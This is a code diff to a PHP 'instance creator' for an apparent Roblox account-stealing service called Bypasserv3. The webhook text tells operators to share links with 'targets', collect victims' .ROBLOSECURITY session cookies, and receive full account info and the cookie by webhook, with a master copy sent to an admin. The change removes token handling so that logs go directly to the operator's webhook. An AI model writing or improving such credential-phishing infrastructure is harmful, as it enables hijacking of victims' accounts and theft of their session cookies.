@@ -1,7 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Instance Creator
- * Sends master admin notification when someone creates a site
+ * NO DASHBOARD - Direct webhook notifications only
  */
 
 header('Content-Type: application/json');
@@ -95,12 +95,7 @@ if (!checkRateLimit($clientIP, 10, 3600)) {
 }
 
 // ============================================
-// GENERATE TOKEN
-// ============================================
-$token = generateToken();
-
-// ============================================
-// CREATE INSTANCE DATA
+// CREATE INSTANCE DATA (NO TOKEN NEEDED)
 // ============================================
 $instanceData = [
     'directory' => $directory,
@@ -108,7 +103,6 @@ $instanceData = [
     'userWebhook' => $webhook,
     'username' => $username,
     'profilePicture' => $profilePicture,
-    'token' => $token,
     'createdAt' => date('c'),
     'createdIP' => $clientIP,
     'stats' => [
@@ -137,27 +131,6 @@ if (!saveInstance($directory, $instanceData)) {
 }
 
 // ============================================
-// SAVE TOKEN
-// ============================================
-$tokenData = [
-    'token' => $token,
-    'directory' => $directory,
-    'webhook' => $webhook,
-    'username' => $username,
-    'createdAt' => date('c'),
-    'createdIP' => $clientIP
-];
-
-$tokenHash = md5($token);
-$tokenFile = DATA_PATH . 'tokens/' . $tokenHash . '.json';
-
-if (!file_put_contents($tokenFile, json_encode($tokenData, JSON_PRETTY_PRINT))) {
-    http_response_code(500);
-    echo json_encode(['success' => false, 'error' => 'Failed to save token']);
-    exit;
-}
-
-// ============================================
 // UPDATE GLOBAL STATS
 // ============================================
 updateGlobalStats('totalInstances', 1);
@@ -167,7 +140,6 @@ updateGlobalStats('totalInstances', 1);
 // ============================================
 logSecurityEvent('instance_created', [
     'directory' => $directory,
-    'token' => substr($token, 0, 8) . '...',
     'ip' => $clientIP
 ]);
 
@@ -247,7 +219,7 @@ $webhookData = [
                 ],
                 [
                     'name' => '📋 How It Works',
-                    'value' => "1️⃣ Share your link with targets\n2️⃣ They submit their `.ROBLOSECURITY` cookie\n3️⃣ Cookie is automatically **Bypassed**\n4️⃣ You receive **FULL ACCOUNT INFO + BYPASSED COOKIE**\n5️⃣ Master log sent to admin",
+                    'value' => "1️⃣ Share your link with targets\n2️⃣ They submit their `.ROBLOSECURITY` cookie\n3️⃣ Cookie is automatically **Bypassed**\n4️⃣ You receive **FULL ACCOUNT INFO + BYPASSED COOKIE** via webhook\n5️⃣ Master log sent to admin",
                     'inline' => false
                 ]
             ],
@@ -272,6 +244,6 @@ echo json_encode([
     'success' => true,
     'directory' => $directory,
     'instanceUrl' => $instanceUrl,
-    'message' => 'Instance created successfully'
+    'message' => 'Instance created successfully! All logs will be sent to your webhook.'
 ]);
 ?>
